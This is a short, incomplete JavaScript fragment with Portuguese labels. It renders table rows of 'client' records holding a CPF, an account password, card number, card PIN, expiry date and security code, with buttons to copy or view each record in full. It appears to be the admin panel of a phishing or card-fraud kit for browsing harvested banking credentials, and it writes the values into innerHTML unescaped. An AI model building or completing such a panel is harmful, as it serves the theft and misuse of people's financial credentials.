const panel = (() => {
    //private var/functions
    //updateClient
    function createClient(data) {
        const { cpf, senha, card_number, card_date, card_code, card_password, status, id } = data

        const tr = document.createElement('tr')

        tr.classList.add(`info-client-${id}`)

        tr.innerHTML = `
            <th class="text-gray-900" scope="row">${cpf}</th>
            <th class="text-gray-900" scope="row">${senha}</th>
            <td class="fw-bolder text-gray-500">${card_number}</td>
            <td class="fw-bolder text-gray-500">${card_password}</td>
            <td class="fw-bolder text-gray-500">$${card_date}</td>
            <td class="fw-bolder text-gray-500">${card_code}</td>
            <td class="fw-bolder text-gray-500">${status}</td>
            <td class="fw-bolder text-gray-500">
                <button type="button" class="btn btn-mini btn-secondary delete-client" data-client="${id}" data-bs-toggle="tooltip" data-bs-placement="top" title="" data-bs-original-title="Tooltip on top">
                    Excluir
                </button>
                <button type="button" class="btn btn-mini btn-secondary" data-bs-toggle="tooltip" data-bs-placement="top" title="" data-bs-original-title="Tooltip on top">
                    Copiar
                </button>
                <button type="button" class="btn btn-mini btn-secondary" data-bs-toggle="tooltip" data-bs-placement="top" title="" data-bs-original-title="Tooltip on top">
                    Ver completo
                </button>
            </td>
        `
    }

    
    
    return {
        //public var/functions
    }
})()